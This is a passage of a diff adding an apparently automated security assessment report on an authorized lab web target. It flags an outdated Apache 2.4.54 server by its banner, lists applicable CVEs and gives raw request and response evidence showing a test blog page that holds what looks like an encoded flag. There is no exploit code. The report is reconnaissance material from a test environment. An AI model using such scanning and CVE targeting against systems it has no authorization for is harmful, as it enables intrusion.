+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [vulnerable-component] Outdated Apache httpd 2.4.54 (Debian) — multiple known CVEs (mod_proxy request smuggling, mod_rewrite disclosure/RCE)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32844/</div>
+<div class="desc">VERSION-BASED finding (matched by banner, not yet exploited). The server advertises `Server: Apache/2.4.54 (Debian)` on every response — confirmed in the response headers of the 200 pages and also printed verbatim in the default 404 error body (&quot;Apache/2.4.54 (Debian) Server at target.local Port 32844&quot;). Apache httpd 2.4.54 was released 2022-06-08 and is many point releases behind current; numerous CVEs have been fixed in later 2.4.x releases and apply to 2.4.54:
+
+- CVE-2023-25690 (CVSS 9.8, HIGH/CRITICAL) — HTTP Request Smuggling in mod_proxy with certain RewriteRule/ProxyPassMatch configurations; affects 2.4.0–2.4.55, fixed in 2.4.56. Can enable request splitting, cache poisoning and bypass of access controls.
+- CVE-2024-38475 (HIGH) — improper escaping of output in mod_rewrite allows mapping URLs to unintended filesystem locations → source-code disclosure and, where those files are executable, potential code execution; affects ≤2.4.59, fixed in 2.4.60.
+- CVE-2024-38476 (HIGH) — backend applications reached via mod_proxy may be exposed to SSRF / information disclosure / local script execution; ≤2.4.59, fixed 2.4.60.
+- CVE-2022-36760 (HIGH) — mod_proxy_ajp HTTP request smuggling (inconsistent request interpretation); 2.4.54 affected, fixed 2.4.55.
+- CVE-2024-27316 (HIGH, DoS) — mod_http2 HTTP/2 CONTINUATION-frame flood memory exhaustion; ≤2.4.58, fixed 2.4.59.
+
+Several of the high-severity items (mod_proxy/mod_rewrite/mod_proxy_ajp) are configuration-dependent — they require the relevant modules enabled and specific rewrite/proxy rules — so the operator should confirm the active module set before treating them as exploitable. Regardless of config, the running version is behind on these fixes and should be upgraded to a current 2.4.x.</div>
+<div><b>Reproduction</b></div><pre>1. Send any request, e.g. `GET /` or a request to a nonexistent path. 2. Observe `Server: Apache/2.4.54 (Debian)` in the response headers (200 pages) and the identical banner printed in the default 404 body. 3. Cross-reference 2.4.54 against the Apache httpd changelog / CVE list — the CVEs above were fixed in 2.4.55–2.4.60, all later than the running version.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyst4kf-4k</code> — <code>artifacts/_/ev-mqyst4kf-4k/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-xyz-404 HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 05:49:48 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32844&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqysucwp-4l</code> — <code>artifacts/_/ev-mqysucwp-4l/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 9188
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 05:50:46 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;Welcome to Encoder64 Blog!&lt;/h1&gt;
+                &lt;p class=&quot;lead mb-0&quot;&gt;e0knbV9hX1NjcmlwdF9LaWRkaWV9&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;!-- Blog Entries Column --&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/EternalBlue.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;EternalBlue: Understanding the Exploit&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;EternalBlue: Understanding the Exploit&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Exploring the NSA-developed cyberattack exploit known as EternalBlue, which targets Microsoft's SMB protocol.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=EternalBlue.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/ML.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Introduction to Machine Learning&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Introduction to Machine Learning&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;A primer on machine learning, highlighting its role in data prediction without explicit programming.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Introduction-to-Machine-Learning.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Cybersecurity.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;The Importance of Cybersecurity&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;The Importance of Cybersecurity&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Discussing the critical importance of protecting digital information in an increasingly interconnected world.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=The-Importance-of-Cybersecurity.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Renew.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Advances in Renewable Energy&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Advances in Renewable Energy&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Reviewing the latest advances in renewable energy technologies and their impact on global energy consumption.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Advances-in-Renewable-Energy.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Blockchain.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Blockchain Technology Explained&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Blockchain Technology Explained&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Explaining the foundational technology behind cryptocurrencies and its potential beyond financial transactions.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Blockchain-Technology.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                
+                &lt;!-- Pagination --&gt;
+                &lt;ul class=&quot;pagination justify-content-center mb-4&quot;&gt;
+                                            &lt;li class=&quot;page-item active&quot;&gt;
+                            &lt;a class=&quot;page-link&quot; href=&quot;?page=1&quot;&gt;1&lt;/a&gt;
+                        &lt;/li&gt;
+                                            &lt;li class=&quot;page-item &quot;&gt;
+                            &lt;a class=&quot;page-link&quot; href=&quot;?page=2&quot;&gt;2&lt;/a&gt;
+                        &lt;/li&gt;
+                                    &lt;/ul&gt;
+
+            &lt;/div&gt;
+
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqysudm6-4m</code> — <code>artifacts/_/ev-mqysudm6-4m/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 9188
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 05:50:47 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;Welcome to Encoder64 Blog!&lt;/h1&gt;
+                &lt;p class=&quot;lead mb-0&quot;&gt;e0knbV9hX1NjcmlwdF9LaWRkaWV9&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;!-- Blog Entries Column --&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/EternalBlue.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;EternalBlue: Understanding the Exploit&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;EternalBlue: Understanding the Exploit&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Exploring the NSA-developed cyberattack exploit known as EternalBlue, which targets Microsoft's SMB protocol.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=EternalBlue.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/ML.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Introduction to Machine Learning&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Introduction to Machine Learning&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;A primer on machine learning, highlighting its role in data prediction without explicit programming.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Introduction-to-Machine-Learning.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Cybersecurity.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;The Importance of Cybersecurity&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;The Importance of Cybersecurity&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Discussing the critical importance of protecting digital information in an increasingly interconnected world.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=The-Importance-of-Cybersecurity.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Renew.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Advances in Renewable Energy&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Advances in Renewable Energy&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Reviewing the latest advances in renewable energy technologies and their impact on global energy consumption.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Advances-in-Renewable-Energy.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Blockchain.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Blockchain Technology Explained&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Blockchain Technology Explained&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Explaining the foundational technology behind cryptocurrencies and its potential beyond financial transactions.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Blockchain-Technology.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                
+                &lt;!-- Pagination --&gt;
+                &lt;ul class=&quot;pagination justify-content-center mb-4&quot;&gt;
+                                            &lt;li class=&quot;page-item active&quot;&gt;
+                            &lt;a class=&quot;page-link&quot; href=&quot;?page=1&quot;&gt;1&lt;/a&gt;
+                        &lt;/li&gt;
+                                            &lt;li class=&quot;page-item &quot;&gt;
+                            &lt;a class=&quot;page-link&quot; href=&quot;?page=2&quot;&gt;2&lt;/a&gt;
+                        &lt;/li&gt;
+                                    &lt;/ul&gt;
+
+            &lt;/div&gt;
+
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
